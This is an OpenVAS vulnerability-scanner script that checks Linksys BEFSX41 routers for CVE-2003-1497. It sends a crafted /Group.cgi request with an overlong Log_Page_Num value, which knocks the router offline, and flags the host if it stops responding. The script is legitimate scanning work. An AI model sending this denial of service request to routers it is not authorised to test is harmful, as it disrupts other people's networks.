# OpenVAS Vulnerability Test
# $Id: linksys_dos.nasl 5390 2017-02-21 18:39:27Z mime $
# Description: LinkSys EtherFast Router Denial of Service Attack
#
# Authors:
# Matt North
#
# Copyright:
# Copyright (C) 2003 Matt North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host seems to be a Linksys EtherFast Cable Firewall/Router.

This product is vulnerable to a remote Denial of service attack : if logging 
is enabled, an attacker can specify a long URL which results in the router 
becoming unresponsive.";

tag_solution = "Update firmware to version 1.45.3
          http://www.linksys.com/download/firmware.asp?fwid=172.

Risk: High";


# Linksys EtherFast Cable/DSL Firewall Router
# BEFSX41 (Firmware 1.44.3) DoS

if(description)
{
  script_id(11891);
  script_version("$Revision: 5390 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:N/A:C");
 script_cve_id("CVE-2003-1497");
 script_bugtraq_id(8834);

  name = "LinkSys EtherFast Router Denial of Service Attack";
  script_name(name);



  summary = "URL results in DoS of Linksys router";
  script_summary(summary);
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2003 Matt North");

  family = "Denial of Service";
   script_family(family);
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("linksys/banner");
  script_require_ports("Services/www", 80);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.digitalpranksters.com/advisories/linksys/LinksysBEFSX41DoSa.html");
  exit(0);
}

include("http_func.inc");


port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if(!banner)exit(0);
if("linksys" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);


req = http_get(port: port, item: "/Group.cgi?Log_Page_Num=1111111111&LogClear=0");
send(socket: soc , data: req);
close(soc);
alive = open_sock_tcp(port);
if (!alive) security_message(port);
